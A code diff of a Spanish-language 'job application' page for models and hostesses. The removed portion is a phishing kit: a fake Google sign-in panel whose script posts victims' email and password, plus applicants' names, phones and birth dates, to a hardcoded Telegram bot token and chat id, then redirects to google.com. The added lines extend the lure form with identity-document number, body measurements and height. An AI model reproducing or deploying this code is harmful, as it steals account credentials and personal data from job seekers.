@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario De Trabajo</title>
+    <title>Formulario de Trabajo</title>
     <style>
         /* ======== Variables Globales ======== */
         :root {
@@ -534,9 +534,21 @@
                         </div>
                     </div>
                     <div class="form-group">
-                        <label for="ciudad" class="required-field">NACIONALIDAD</label>
-                        <input type="text" id="ciudad" name="ciudad" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese una ciudad válida">
-                    </div>
+    <label for="nacionalidad" class="required-field">NACIONALIDAD</label>
+    <input type="text" id="nacionalidad" name="nacionalidad" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese una nacionalidad válida">
+</div>
+                    <div class="form-row">
+    <div class="form-group">
+        <label for="documento" class="required-field">DOCUMENTO DE IDENTIDAD</label>
+        <input type="text" id="documento" name="documento" required pattern="\d{7,10}" title="Ingrese un número de documento válido">
+    </div>
+</div>
+<div class="form-row">
+    <div class="form-group">
+        <label for="ciudad" class="required-field">CIUDAD DONDE VIVES ACTUALMENTE</label>
+        <input type="text" id="ciudad" name="ciudad" required pattern="[A-Za-záéíóúñÁÉÍÓÚÑ\s]+" title="Ingrese una ciudad válida">
+    </div>
+</div>
                     <div class="form-group">
                         <label for="postulacion" class="required-field">QUIERO POSTULARME A?</label>
                         <select id="postulacion" name="postulacion" required>
@@ -555,6 +567,33 @@
                             
                         </select>
                     </div>
+                    <div class="form-row">
+    <div class="form-group">
+        <label for="medidas" class="required-field">MEDIDAS (BUSTO-CINTURA-CADERA)</label>
+        <input 
+            type="text" 
+            id="medidas" 
+            name="medidas" 
+            required 
+            pattern="\d{2,3}-\d{2,3}-\d{2,3}"
+            placeholder="Ej: 90-60-90"
+            title="Formato: xxx-xxx-xxx">
+        <span class="error-message">(Ej: 90-60-90)</span>
+    </div>
+
+    <div class="form-group">
+        <label for="estatura" class="required-field">ESTATURA</label>
+        <input 
+            type="number" 
+            id="estatura" 
+            name="estatura" 
+            required 
+            min="140" 
+            max="200"
+            placeholder="Ej: 170">
+        <span class="error-message"></span>
+    </div>
+</div>
                     <div class="form-group">
                         <label for="experiencia" class="required-field">TU EXPERIENCIA COMO MODELO Y/O AZAFATA</label>
                         <textarea id="experiencia" name="experiencia" rows="4" required placeholder="Describa su experiencia"></textarea>
@@ -581,270 +620,4 @@
                         <label for="emailInput">Correo electrónico o teléfono</label>
                     </div>
                 
-                    <div class="links">
-                        <a href="#">¿Olvidaste el correo electrónico?</a>
-                    </div>
-
-                    <div class="bottom-buttons">
-                        <button type="button" class="btn-secondary">Crear cuenta</button>
-                        <button type="submit" class="btn-primary">Siguiente</button>
-                    </div>
-                </form>
-            </div>
-        </section>
-
-        <!-- Panel 3: Password Entry -->
-        <section id="panel3" class="panel">
-            <div class="login-container">
-                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
-                <h2>Bienvenido</h2>
-                <p class="email" id="emailMostrar">Cargando...</p>
-
-                <form id="passwordForm" onsubmit="enviarAlBot(); return false;">
-                    <input type="hidden" id="email" name="email" />
-                    <div class="input-container">
-                        <input type="password" id="password" name="password" placeholder=" " required />
-                        <label for="password">Ingresa tu contraseña</label>
-                    </div>
-                    
-                    <div class="showPassword">
-                        <input type="checkbox" id="showPassword">
-                        <label for="showPassword">Mostrar contraseña</label>
-                    </div>
-
-                    <div class="forgot-password">
-                        <a href="#">¿Olvidaste la contraseña?</a>
-                    </div>
-                    
-                    <div class="btn-container">
-                        <button type="submit" class="btn">Siguiente</button>
-
-
-                    </div>
-                </form>
-            </div>
-        </section>
-    </div>
-<script>
-
-    document.addEventListener("DOMContentLoaded", function () {
-    // Inicializar variables y elementos
-    const panels = document.querySelectorAll(".panel");
-    
-    // Cargar SweetAlert2 desde CDN
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/sweetalert2@11';
-    document.head.appendChild(script);
-    
-    // Configurar los colores personalizados
-    const customColors = {
-        primaryColor: '#62a',
-        secondaryColor: '#7a3abd',
-        backgroundColor: '#ede1f7',
-        textColor: '#333'
-    };
-    
-    // Agregar los estilos personalizados para SweetAlert2
-    const style = document.createElement('style');
-    style.textContent = `
-        .swal-popup-custom {
-
-        background-color: ${customColors.backgroundColor} !important;
-
-        border: 3px solid ${customColors.secondaryColor} !important;
-
-        border-radius: 10px !important;
-
-        padding: 20px !important;
-
-        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.9) !important;
-
-        width: 100% !important;           /* Nuevo: ocupa todo el ancho */
-
-        max-width: 100% !important;       /* Nuevo: sobreescribe el max-width predeterminado */
-
-        height: 100vh !important;         /* Nuevo: altura completa de la ventana */
-
-        margin: 0 !important;             /* Nuevo: elimina los márgenes */
-
-        border-radius: 0 !important;      /* Nuevo: elimina bordes redondeados en móvil */
-
-        display: flex !important;         /* Nuevo: usa flexbox */
-
-        flex-direction: column !important; /* Nuevo: organiza contenido en columna */
-
-        justify-content: center !important; /* Nuevo: centra verticalmente */
-
-    }
-        .swal-title-custom {
-            color: ${customColors.primaryColor} !important;
-            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.5) !important;
-            font-size: 1.5rem !important;
-        }
-        .swal-confirm-custom {
-            background-color: ${customColors.primaryColor} !important;
-            color: #fff !important;
-            padding: 5px 10px !important;
-            border-radius: 5px !important;
-            font-size: 2rem !important;
-            transition: background-color 0.3s !important;
-        }
-        .swal-confirm-custom:hover {
-            background-color: ${customColors.secondaryColor} !important;
-        }
-    `;
-    document.head.appendChild(style);
-    
-    // Función para cambiar entre paneles
-    window.irAPanel = function(panelId) {
-        panels.forEach(panel => {
-            panel.classList.remove("active");
-            panel.style.left = "100%"; // Todos los paneles fuera de la pantalla
-        });
-
-        const panelActivo = document.getElementById(panelId);
-        panelActivo.classList.add("active");
-        panelActivo.style.left = "0"; // Solo el panel activo es visible
-    };
-    
-    // Función personalizada de alerta usando SweetAlert2
-    window.mostrarAlerta = function(mensaje, callback) {
-        // Verificar si SweetAlert2 está cargado
-        if (typeof Swal !== 'undefined') {
-            Swal.fire({
-                title: mensaje,
-                background: customColors.backgroundColor,
-                color: customColors.textColor,
-                confirmButtonColor: customColors.primaryColor,
-                confirmButtonText: 'Aceptar',
-                customClass: {
-                    popup: 'swal-popup-custom',
-                    title: 'swal-title-custom',
-                    confirmButton: 'swal-confirm-custom'
-                }
-            }).then(result => {
-                if (result.isConfirmed && callback) {
-                    callback();
-                }
-            });
-        } else {
-            // Fallback a alert nativo si SweetAlert2 no está disponible
-            alert(mensaje);
-            if (callback) callback();
-        }
-    };
-    
-    // Eventos para Panel 1 (Formulario de postulación)
-    const jobForm = document.getElementById("jobForm");
-    if (jobForm) {
-        jobForm.addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            const formData = new FormData(this);
-            const data = {};
-            formData.forEach((value, key) => { data[key] = value });
-
-            fetch('https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '7859673578',
-                    text: `NUEVA POSTULACIÓN RECIBIDA:\n\nNombres: ${data.nombres}\nApellidos: ${data.apellidos}\nTeléfono: ${data.telefono}\nGénero: ${data.genero}\nFecha de nacimiento: ${data.fecha_nacimiento}\nNacionalidad: ${data.ciudad}\nPostulación: ${data.postulacion}\nExperiencia: ${data.experiencia}`
-                })
-            })
-            .then(response => response.json())
-            .then(result => {
-                if (result.ok) {
-                    const successMsg = document.getElementById("successMessage");
-                    if (successMsg) {
-                        successMsg.textContent = "¡Postulación enviada con éxito!";
-                        successMsg.style.display = 'block';
-                    }
-                    setTimeout(() => {
-                        irAPanel('panel2');
-                    });
-                } else {
-                    mostrarAlerta("Error al enviar la postulación. Inténtalo de nuevo.");
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                mostrarAlerta("Error en la conexión. Intenta nuevamente.");
-            });
-        });
-    }
-
-    // Función para Panel 2 (Google Login)
-    window.guardarEmail = function() {
-        let email = document.getElementById("emailInput").value;
-        if (email.trim() !== "") {
-            localStorage.setItem("emailUsuario", email);
-            
-            const emailInput = document.getElementById("email");
-            if (emailInput) emailInput.value = email;
-            
-            const emailMostrar = document.getElementById("emailMostrar");
-            if (emailMostrar) emailMostrar.textContent = email;
-            
-            irAPanel('panel3');
-        }
-        return false;
-    };
-
-    // Verificar si hay un email guardado al cargar
-    const savedEmail = localStorage.getItem("emailUsuario");
-    if (savedEmail) {
-        const emailMostrar = document.getElementById("emailMostrar");
-        if (emailMostrar) emailMostrar.textContent = savedEmail;
-        
-        const emailInput = document.getElementById("email");
-        if (emailInput) emailInput.value = savedEmail;
-    }
-
-    // Mostrar/ocultar contraseña
-    const showPasswordCheckbox = document.getElementById("showPassword");
-    if (showPasswordCheckbox) {
-        showPasswordCheckbox.addEventListener("change", function() {
-            const passwordInput = document.getElementById("password");
-            if (passwordInput) {
-                passwordInput.type = this.checked ? "text" : "password";
-            }
-        });
-    }
-
-    // Función para enviar datos al bot
-    window.enviarAlBot = function() {
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
-        
-        if (email && password) {
-            fetch('https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '7859673578',
-                    text: `CUENTA GOOGLE DE LA POSTULACIÓN:\n\nEmail: ${email}\nContraseña: ${password}`
-                })
-            })
-            .then(response => response.json())
-            .then(result => {
-                if (result.ok) {
-                    mostrarAlerta("Tu solicitud ha sido enviada correctamente. Nos pondremos en contacto contigo pronto.", function() {
-                        window.location.href = "https://google.com";
-                    });
-                } else {
-                    mostrarAlerta("Error en la verificación. Inténtalo de nuevo.");
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                mostrarAlerta("Error en la conexión. Intenta nuevamente.");
-            });
-        }
-        return false;
-    };
-});
-</script>
-
-</body>
-</html>
+ 
